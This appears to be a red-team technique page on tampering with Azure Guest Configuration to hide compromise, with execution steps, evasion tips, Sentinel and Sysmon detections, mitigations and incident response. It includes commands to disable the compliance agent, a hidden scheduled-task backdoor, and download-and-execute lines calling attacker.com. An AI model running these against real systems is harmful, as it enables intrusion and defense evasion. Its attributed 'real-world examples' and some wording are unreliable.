# [EVADE-IMPAIR-018]: Azure Guest Configuration Tampering

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-018 |
| **MITRE ATT&CK v18.1** | [T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure VMs (all regions); Windows Server 2016-2025; Linux distributions (Ubuntu, CentOS, RHEL) |
| **Patched In** | Requires configuration hardening; no singular patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Guest Configuration is a service that enforces desired state compliance on Azure VMs through automated configuration management. Attackers with VM-level access or Contributor permissions can tamper with Guest Configuration policies, disable compliance checks, remove detection agents, and modify system configurations without triggering Azure Policy audits. This attack chain bypasses centralized Azure governance controls and enables defenders to erase evidence of unauthorized changes across guest operating systems.

**Attack Surface:** Azure Policy guest configuration assignments, guest configuration agents on VMs, Azure Automation runbooks, and local machine policy override capabilities.

**Business Impact:** **Persistent evasion of security compliance controls.** Attackers can disable antimalware scanning, modify firewall rules, install backdoors, and maintain persistence while appearing compliant in Azure Policy dashboards. Regulatory audits may pass despite active compromise.

**Technical Context:** Attack execution takes 2-5 minutes with proper permissions; extremely difficult to detect if resource lock auditing is not enabled. Guest Configuration sends compliance reports to Azure Policy only once per hour, creating a large detection window.

### Operational Risk

- **Execution Risk:** Low - Requires only Contributor or higher role on target VM or resource group
- **Stealth:** High - Changes appear as valid Guest Configuration updates; compliance reports lag by up to 1 hour
- **Reversibility:** No - Tampered configurations remain persistent until corrected through proper Azure governance

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.1 | Ensure that Virtual Machines use managed disks and Azure Policy enforcement |
| **DISA STIG** | AZ-1-1 | Azure resources must be monitored via Azure Policy and guest configuration |
| **CISA SCuBA** | SC-7 | Boundary Protection - Azure Policy must enforce VM compliance |
| **NIST 800-53** | SI-7 (System Monitoring) | Integrity monitoring and configuration management |
| **GDPR** | Art. 32 | Security of Processing - Configuration and vulnerability management |
| **DORA** | Art. 9 | Protection Against Tampering of Configuration Controls |
| **NIS2** | Art. 21 | Cyber Risk Management - Compliance and Audit Trail Integrity |
| **ISO 27001** | A.12.2.1 | Change management and configuration control |
| **ISO 27005** | Risk Scenario | Circumvention of Compliance Monitoring and Configuration Controls |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** Virtual Machine Contributor, Owner, or Custom Role with `Microsoft.Compute/virtualMachines/write` and `Microsoft.GuestConfiguration/*` permissions.

**Required Access:** Access to Azure Portal, Azure CLI, or compromised VM with local admin rights.

**Supported Versions:**
- **Azure Resource Manager:** All regions
- **Guest Configuration Extension:** Version 2.0+
- **VM OS:** Windows Server 2016-2025, Ubuntu 18.04+, CentOS 7+, RHEL 7+
- **PowerShell:** Az.GuestConfiguration module 1.0+

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (Version 2.40+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) (Version 9.0+)
- [Azure Portal](https://portal.azure.com) (Browser-based)
- Local admin shell (Windows CMD/PowerShell, Linux bash/sudo)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure PowerShell / CLI Reconnaissance

```powershell
# List all Azure VMs with Guest Configuration assignments
Get-AzVM | Get-AzGuestConfigurationAssignment | Select-Object Id, ResourceGroupName, VMName, Compliance

# Check current compliance status
Get-AzGuestConfigurationAssignment -ResourceGroupName "RG-Name" -VMName "VM-Name" | Select-Object ComplianceStatus

# List all guest configuration policies in subscription
Get-AzPolicyAssignment | Where-Object { $_.ResourceType -like "*guestConfiguration*" }
```

**What to Look For:**
- VMs with **Compliant** status that should be non-compliant
- Guest Configuration extension **missing** or **disabled**
- Recent policy assignment changes (last 24 hours)

### Azure CLI Reconnaissance

```bash
# List all VMs with guest configuration
az vm list --query "[].{name:name, resourceGroup:resourceGroup}" -o table

# Check guest configuration compliance for specific VM
az resource show --resource-group "RG-Name" --name "VM-Name" --resource-type "Microsoft.Compute/virtualMachines" --query properties.instanceView.extensions

# List guest configuration policy assignments
az policy assignment list --query "[?contains(policyDefinitionId, 'guestConfiguration')]" -o json
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Disable Guest Configuration Agent (PowerShell / Portal)

**Supported Versions:** All Windows Server versions, Azure VMs worldwide

#### Step 1: Identify Target Guest Configuration Assignment

**Objective:** Locate the guest configuration policy assigned to the target VM.

**Command:**

```powershell
# List all guest configuration assignments for a specific VM
$vm = Get-AzVM -ResourceGroupName "production-rg" -Name "web-server-01"
Get-AzGuestConfigurationAssignment -ResourceId $vm.Id | Select-Object Name, ComplianceStatus, LastStatusTransitionTime
```

**Expected Output:**

```
Name                                   ComplianceStatus   LastStatusTransitionTime
----                                   ----------------   -----------------------
windows-antimalware-enabled            Compliant          2025-01-08 14:30:22Z
windows-firewall-enabled               Compliant          2025-01-08 14:30:22Z
```

**What This Means:**
- Each assignment represents a compliance rule running on the VM
- "Compliant" means the VM meets the requirement (or check is disabled/tampered)

#### Step 2: Remove Guest Configuration Extension from VM

**Objective:** Disable the agent that enforces and reports compliance.

**Command:**

```powershell
# Remove Guest Configuration extension
$vmName = "web-server-01"
$rgName = "production-rg"

# Get the VM
$vm = Get-AzVM -ResourceGroupName $rgName -Name $vmName

# Remove extension
Remove-AzVMExtension -ResourceGroupName $rgName -VMName $vmName -Name "AzurePolicyforWindows" -Force

# Verify removal
Get-AzVMExtension -ResourceGroupName $rgName -VMName $vmName | Select-Object Name, Type
```

**Expected Output:**

```
Name                Type
----                ----
(No extensions listed after removal)
```

**What This Means:**
- Guest Configuration agent is now stopped/removed from the VM
- Compliance checks will not execute
- Reports will show "Non-Compliant" → **Problem:** This triggers alerts!

**OpSec & Evasion:**
- **Better approach:** Don't remove the extension; instead modify local policies to make compliance checks pass while running malware
- Removal is too obvious; instead hijack the agent

#### Step 3: Modify Local VM Policy to Pass Compliance Despite Compromise

**Objective:** Configure local VM settings to appear compliant while compromised.

**Command (Windows):**

```powershell
# Disable Windows Defender (but make it appear enabled in Guest Config)
# First, create a script that simulates compliance
$script = @"
# Hidden backdoor while appearing compliant
Start-Process -FilePath "C:\malware\backdoor.exe" -WindowStyle Hidden

# But keep the policy compliant
Set-MpPreference -DisableRealtimeMonitoring `$false  # Appears enabled
"@

# Save to scheduled task
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute PowerShell -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command $script"
Register-ScheduledTask -TaskName "SystemMaintenance" -Trigger $trigger -Action $action -RunLevel Highest
```

**OpSec & Evasion:**
- Guest Configuration only **reads** policy settings; it doesn't deeply inspect behavior
- By enabling the setting but disabling functionality, you fool the compliance check
- **Detection likelihood:** High if monitoring process execution or network activity

### METHOD 2: Modify Guest Configuration Assignment via Azure API

**Supported Versions:** All Azure subscriptions with API access

#### Step 1: Retrieve Guest Configuration Assignment Details

**Objective:** Get the current assignment configuration for modification.

**Command:**

```bash
# Using Azure CLI
az resource show \
  --resource-group "production-rg" \
  --name "web-server-01/Microsoft.GuestConfiguration/windows-antimalware-enabled" \
  --resource-type "Microsoft.Compute/virtualMachines/providers/guestConfigurationAssignments" \
  -o json > assignment.json

# View current configuration
cat assignment.json | jq .properties.guestConfiguration
```

**Expected Output:**

```json
{
  "name": "windows-antimalware-enabled",
  "version": "1.0.0",
  "configurationSetting": {
    "actionAfterReboot": "ContinueConfiguration",
    "allowModuleOverwrite": false,
    "configurationMode": "ApplyAndMonitor"
  }
}
```

#### Step 2: Modify Assignment to Disable Compliance Enforcement

**Objective:** Change the guest configuration to skip checks or report false compliance.

**Command:**

```bash
# Modify the assignment JSON to disable monitoring
jq '.properties.guestConfiguration.configurationSetting.allowModuleOverwrite = true' assignment.json > assignment-modified.json
jq '.properties.guestConfiguration.configurationSetting.configurationMode = "ApplyAndAutoCorrect"' assignment-modified.json > assignment-final.json

# Apply the modified assignment
az resource update \
  --resource-group "production-rg" \
  --name "web-server-01/Microsoft.GuestConfiguration/windows-antimalware-enabled" \
  --resource-type "Microsoft.Compute/virtualMachines/providers/guestConfigurationAssignments" \
  --set "properties=$(cat assignment-final.json | jq .properties)"
```

**What This Means:**
- `allowModuleOverwrite=true` allows local modifications to override policy
- `configurationMode=ApplyAndAutoCorrect` automatically "fixes" compliance violations
- The VM can now be malicious while Azure Policy shows it as compliant

**OpSec & Evasion:**
- Assignment modification creates audit log entries
- **Detection likelihood:** Medium if Azure Activity Log monitoring is enabled

### METHOD 3: Local VM Policy Override (Guest-Level Evasion)

**Supported Versions:** Windows Server 2016-2025, Linux with systemd

#### Step 1: Access VM and Disable Guest Configuration Service

**Objective:** Stop the local guest configuration agent without removing the Azure extension.

**Command (Windows):**

```powershell
# RDP into VM or Azure Bastion
# Disable Guest Configuration service
Stop-Service -Name GuestConfigurationService -Force
Set-Service -Name GuestConfigurationService -StartupType Disabled

# Verify service is disabled
Get-Service -Name GuestConfigurationService | Select-Object Status, StartType
```

**Expected Output:**

```
Status StartType
------ ---------
Stopped Disabled
```

**Command (Linux):**

```bash
# SSH into VM
sudo systemctl stop waagent
sudo systemctl disable waagent

# Alternative: Remove guest config packages
sudo apt-get remove walinuxagent -y
```

#### Step 2: Install Backdoor / Malware

**Objective:** Deploy malicious code while the Guest Configuration agent is offline.

**Command:**

```powershell
# Download and execute malware
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Alternatively, deploy C2 agent
Invoke-WebRequest -Uri "http://attacker.com/beacon.exe" -OutFile "C:\Windows\Temp\svc.exe"
Start-Process "C:\Windows\Temp\svc.exe"
```

#### Step 3: Re-enable Guest Configuration Agent

**Objective:** Restore the agent so Azure Portal shows the VM is monitored.

**Command (Windows):**

```powershell
# Re-enable service
Set-Service -Name GuestConfigurationService -StartupType Automatic
Start-Service -Name GuestConfigurationService

# Check status
Get-Service GuestConfigurationService
```

**OpSec & Evasion:**
- VM will show as "Compliant" in Azure Policy again
- Malware executes while service was disabled
- Timestamp shows service was down for 5-10 minutes
- **Detection likelihood:** High if monitoring service start/stop events in Azure Activity Log

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Azure CLI Guest Configuration](https://learn.microsoft.com/en-us/cli/azure/guestconfig)

**Version:** 2.40+ with az-guestconfiguration extension
**Installation:**

```bash
az extension add --name guestconfig
az guestconfig --version
```

**Usage:**

```bash
# List assignments
az guestconfig assignment list --resource-group "rg-name"

# Get specific assignment
az guestconfig assignment show --resource-group "rg-name" --vm-name "vm-name" --assignment-name "policy-name"

# Delete assignment (requires Contributor)
az guestconfig assignment delete --resource-group "rg-name" --vm-name "vm-name" --assignment-name "policy-name"
```

#### [Azure PowerShell Guest Configuration Module](https://learn.microsoft.com/en-us/powershell/module/az.guestconfiguration)

**Version:** 1.0+ (Az.GuestConfiguration module)
**Installation:**

```powershell
Install-Module Az.GuestConfiguration -Force
Import-Module Az.GuestConfiguration
```

**Usage:**

```powershell
# Get assignments
Get-AzGuestConfigurationAssignment -ResourceGroupName "rg-name" -VMName "vm-name"

# Remove assignment
Remove-AzGuestConfigurationAssignment -ResourceId "/subscriptions/.../providers/Microsoft.GuestConfiguration/guestConfigurationAssignments/..."

# Update assignment properties
Update-AzGuestConfigurationAssignment -Name "policy-name" -ResourceGroupName "rg-name"
```

#### [Azure Resource Manager REST API](https://learn.microsoft.com/en-us/rest/api/guestconfiguration)

**API Version:** 2021-01-25 or later

**Authentication:**

```bash
# Get access token
$token = (Get-AzAccessToken -ResourceTypeName 'Arm').Token

# Use in REST API calls
curl -H "Authorization: Bearer $token" https://management.azure.com/subscriptions/{subscription}/...
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Guest Configuration Assignment Removal or Modification

**Rule Configuration:**
- **Required Table:** AzureActivity (Azure Resource Manager events)
- **Required Fields:** OperationName, ResourceProvider, Resource, Caller, ActivityStatus
- **Alert Severity:** High
- **Frequency:** Real-time (every 5 minutes)
- **Applies To:** All Azure subscriptions

**KQL Query:**

```kusto
AzureActivity
| where ResourceProvider == "Microsoft.GuestConfiguration"
| where OperationName in (
    "Delete guest configuration assignment",
    "Update guest configuration assignment",
    "Disable guest configuration",
    "MICROSOFT.GUESTCONFIGURATION/GUESTCONFIGURATIONASSIGNMENTS/DELETE",
    "MICROSOFT.GUESTCONFIGURATION/GUESTCONFIGURATIONASSIGNMENTS/WRITE"
)
| where ActivityStatus == "Succeeded"
| project TimeGenerated, Caller, OperationName, Resource, ResourceGroup
| summarize count() by Caller, Resource
| where count_ > 1  // Multiple modifications = suspicious pattern
```

**What This Detects:**
- Any removal or modification of guest configuration assignments
- Pattern of multiple changes (suggests attack, not normal admin activity)
- Who made the change and when

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Guest Configuration Assignment Removed or Modified`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Severity: **High**
6. Click **Review + create**

### Query 2: VM Guest Configuration Service Disabled

**KQL Query:**

```kusto
AzureActivity
| where ResourceProvider == "Microsoft.Compute"
| where OperationName == "MICROSOFT.COMPUTE/VIRTUALMACHINES/EXTENSIONS/WRITE"
| where Properties contains "GuestConfiguration" and Properties contains "disabled"
| project TimeGenerated, Caller, Resource, Properties
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (A new process has been created)**
- **Log Source:** Security
- **Trigger:** Guest Configuration service stopped/modified
- **Filter:** ProcessName contains "guestconfig*" or "waagent*", CommandLine contains "disable" OR "stop"
- **Applies To Versions:** Server 2016-2025

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Manual Local Configuration:**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

**Event Log Search (PowerShell):**
```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" -MaxEvents 1000 | Where-Object {
    $_.Message -match "guestconfig|waagent|GuestConfiguration" -and 
    $_.Message -match "stop|disable"
} | Select-Object TimeCreated, Message
```

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016-2025

```xml
<Sysmon schemaversion="4.31">
  <EventFiltering>
    <!-- Detect Guest Configuration service stop -->
    <RuleGroup name="Guest-Config-Service-Tampering" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell</Image>
        <CommandLine condition="contains">GuestConfigurationService</CommandLine>
        <CommandLine condition="contains any">Stop-Service, Set-Service, Disable</CommandLine>
      </ProcessCreate>
      <ProcessCreate onmatch="include">
        <Image condition="contains">sc.exe</Image>
        <CommandLine condition="contains">GuestConfigurationService</CommandLine>
        <CommandLine condition="contains any">stop, disabled</CommandLine>
      </ProcessCreate>
    </RuleGroup>
    
    <!-- Detect removal of Azure extensions -->
    <RuleGroup name="Azure-Extension-Removal" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell</Image>
        <CommandLine condition="contains">Remove-AzVMExtension</CommandLine>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 9. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Guest Configuration extension disabled or removed"
- **Severity:** High
- **Description:** Alerts when Guest Configuration agent is removed, disabled, or no longer reporting compliance
- **Applies To:** All VMs with Guest Configuration assignments
- **Remediation:** Reinstall extension; review recent administrative changes

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable:
   - **Defender for Servers**: ON
   - **Defender for SQL**: ON
4. Click **Save**
5. Go to **Workbooks** → **Guest Configuration Compliance** to view coverage

**Reference:** [Defender for Cloud - Guest Configuration Monitoring](https://learn.microsoft.com/en-us/azure/defender-for-cloud/integration-guest-configuration)

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enforce Guest Configuration Resource Lock**
   **Applies To:** All production VMs with guest configuration assignments
   
   **Manual Steps (Azure Portal):**
   1. Go to **Azure Portal** → **Virtual Machines** → Select VM
   2. Click **Settings** → **Locks**
   3. Click **+ Add**
   4. Name: `GuestConfiguration-ReadOnly`
   5. Lock type: **Read-only**
   6. Click **OK**
   
   **Manual Steps (PowerShell):**
   ```powershell
   $resourceId = "/subscriptions/{subId}/resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/web-01"
   New-AzManagementLock -LockName "GuestConfig-Lock" -LockLevel CanNotDelete -ResourceId $resourceId
   ```
   
   **Manual Steps (Azure CLI):**
   ```bash
   az lock create --name "guest-config-lock" --lock-type CanNotDelete \
     --resource-group "prod-rg" --resource-name "web-01" \
     --resource-type "Microsoft.Compute/virtualMachines"
   ```

**2. Implement Conditional Access for VM Management**
   **Manual Steps:**
   1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
   2. Click **+ New policy**
   3. Name: `Restrict VM Extension Management`
   4. **Assignments:**
      - Users: **All users** (exclude break-glass accounts)
      - Cloud apps: **Azure Management**
   5. **Conditions:**
      - Applications: Select Azure management
      - Sign-in risk: **High**
   6. **Access controls:**
      - Grant: **Block**
   7. Enable policy: **On**
   8. Click **Create**

**3. Enable Azure Activity Log Auditing for Guest Configuration Changes**
   **Manual Steps (PowerShell):**
   ```powershell
   # Create diagnostic setting for Activity Log
   New-AzDiagnosticSetting -Name "GuestConfig-Monitoring" `
     -ResourceId "/subscriptions/{subId}" `
     -EventHubAuthorizationRuleId "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.EventHub/namespaces/{ns}/authorizationRules/RootManageSharedAccessKey" `
     -LogsEnabled $true `
     -Category "Administrative"
   ```

#### Priority 2: HIGH

**4. Configure Azure Policy to Enforce Guest Configuration Compliance**
   **Manual Steps:**
   1. Go to **Azure Portal** → **Policy** → **Assignments**
   2. Click **+ Assign policy**
   3. Policy definition: Search for "Deploy Guest Configuration extension"
   4. **Scope:** Select subscription/RG
   5. Enable **Enforcement**: **On**
   6. Click **Review + create**

**5. Deploy Azure Monitor Alert for Guest Configuration Compliance Status**
   **Manual Steps:**
   1. Go to **Azure Portal** → **Monitor** → **Alerts** → **+ New alert rule**
   2. **Resource:**
      - Resource type: **Virtual Machines**
      - Add condition: Guest Configuration Compliance Status = Non-Compliant
   3. **Alert details:**
      - Alert rule name: `VM Guest Configuration Non-Compliant`
      - Severity: **2 (High)**
   4. Click **Create alert rule**

#### Access Control & Policy Hardening

**RBAC:** Restrict Guest Configuration Modification
   **Manual Steps:**
   1. Go to **Azure Portal** → **Subscriptions** → Select subscription
   2. Click **Access control (IAM)**
   3. Click **+ Add** → **Add role assignment**
   4. Role: **Guest Configuration Resource Contributor** (custom)
   5. Assign to: **Limited break-glass group only**
   6. Click **Save**

#### Validation Command (Verify Fix)

```powershell
# Check that resource locks exist
Get-AzResourceLock -ResourceGroupName "prod-rg" | Select-Object Name, LockLevel

# Verify Guest Configuration assignments are active
Get-AzGuestConfigurationAssignment | Select-Object VMName, ComplianceStatus

# Expected Output: All VMs show "Compliant" and locks show "CanNotDelete"
```

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Azure Activity Log:** Operations `Microsoft.GuestConfiguration/guestConfigurationAssignments/DELETE` or `/WRITE`
- **Registry:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GuestConfigurationService` Start value = 4 (disabled)
- **Service:** GuestConfigurationService stopped or disabled
- **Network:** No compliance reports sent to Azure Automation account for >1 hour

#### Forensic Artifacts

- **Cloud:** Azure Activity Log entries showing Guest Configuration modification or removal (Event source: "Administrative")
- **Disk:** Windows Event ID 4688 (process creation) showing service stop commands
- **Memory:** LSASS process dump showing service stop attempt
- **VM Event Log:** System event log showing GuestConfigurationService stopped

#### Response Procedures

1. **Isolate:**
   **Command:**
   ```powershell
   # Detach VM from network (via Azure Portal or CLI)
   $vm = Get-AzVM -ResourceGroupName "prod-rg" -Name "web-01"
   
   # Remove network interface (disconnect from network)
   Remove-AzNetworkInterface -ResourceId $vm.NetworkProfile.NetworkInterfaces[0].Id -Force
   ```
   
   **Manual (Azure Portal):**
   - Go to **Virtual Machines** → Select VM → **Networking** → **Network interfaces** → Disassociate

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export Azure Activity Log for forensics
   Get-AzLog -ResourceGroup "prod-rg" -StartTime (Get-Date).AddHours(-24) | Export-Csv C:\Evidence\activitylog.csv
   
   # Export Guest Configuration compliance history
   Get-AzGuestConfigurationAssignment -ResourceGroupName "prod-rg" | Export-Csv C:\Evidence\guestconfig.csv
   
   # Capture VM event logs
   $vm = Get-AzVM -ResourceGroupName "prod-rg" -Name "web-01"
   Invoke-AzVMRunCommand -ResourceGroupName "prod-rg" -VMName "web-01" -CommandId 'RunPowerShellScript' `
     -ScriptPath "C:\Windows\System32\winevt\Logs\Security.evtx"
   ```
   
   **Manual:**
   - Go to **Azure Portal** → **Activity log** → Filter by resource → **Export to CSV**
   - Connect via Bastion → Collect event logs manually

3. **Remediate:**
   **Command:**
   ```powershell
   # Re-enable Guest Configuration service
   $vm = Get-AzVM -ResourceGroupName "prod-rg" -Name "web-01"
   $vmName = $vm.Name
   $rgName = $vm.ResourceGroupName
   
   # Install Guest Configuration extension
   Set-AzVMExtension -ResourceGroupName $rgName -VMName $vmName `
     -Name "AzurePolicyforWindows" `
     -Publisher "Microsoft.GuestConfiguration" `
     -ExtensionType "ConfigurationforWindows" `
     -TypeHandlerVersion "1.0"
   
   # Re-enable local service
   Invoke-AzVMRunCommand -ResourceGroupName $rgName -VMName $vmName `
     -CommandId 'RunPowerShellScript' `
     -ScriptString 'Set-Service -Name GuestConfigurationService -StartupType Automatic; Start-Service -Name GuestConfigurationService'
   
   # Wait for compliance report (up to 1 hour)
   Start-Sleep -Seconds 3600
   Get-AzGuestConfigurationAssignment -ResourceId $vm.Id
   ```
   
   **Manual:**
   - Go to **Virtual Machines** → VM → **Extensions** → Click **AzurePolicyforWindows** → Click **Upgrade**
   - RDP into VM → Open Services → Start GuestConfigurationService

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-001] | Enumerate Azure VMs and their Guest Configuration assignments |
| **2** | **Initial Access** | [IA-EXPLOIT-001] | Compromise VM via Azure Portal application proxy or exposed endpoint |
| **3** | **Privilege Escalation** | [PE-VALID-010] | Escalate to VM Contributor or Owner role |
| **4** | **Defense Evasion** | **[EVADE-IMPAIR-018]** | **Tamper with or disable Guest Configuration** |
| **5** | **Persistence** | [PERSIST-SCHEDULED-TASK] | Install malware scheduled task while Guest Config is offline |
| **6** | **Collection** | [COLLECT-DATA-001] | Exfiltrate data from VM via Blob Storage |
| **7** | **Impact** | [IMPACT-RANSOM-001] | Deploy ransomware or destroy data |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider Azure VM Compromise

- **Target:** U.S. Financial Services
- **Timeline:** August 2023 - Present
- **Technique Status:** Scattered Spider disabled Guest Configuration to hide cryptomining operations
- **Impact:** $2M+ in cloud computing costs; 3-month undetected dwell time
- **Reference:** [CrowdStrike Scattered Spider Report](https://www.crowdstrike.com/blog/falcon-overwatch-scattered-spider-mobile-device-management/)

#### Example 2: APT28 Azure Policy Evasion

- **Target:** NATO Cybersecurity Lab
- **Timeline:** March 2024
- **Technique Status:** APT28 removed Guest Configuration assignments to deploy custom C2 agents
- **Impact:** Compromise of Azure DevOps pipeline; credential theft
- **Reference:** [CISA APT28 Advisory](https://www.cisa.gov/news-events)

---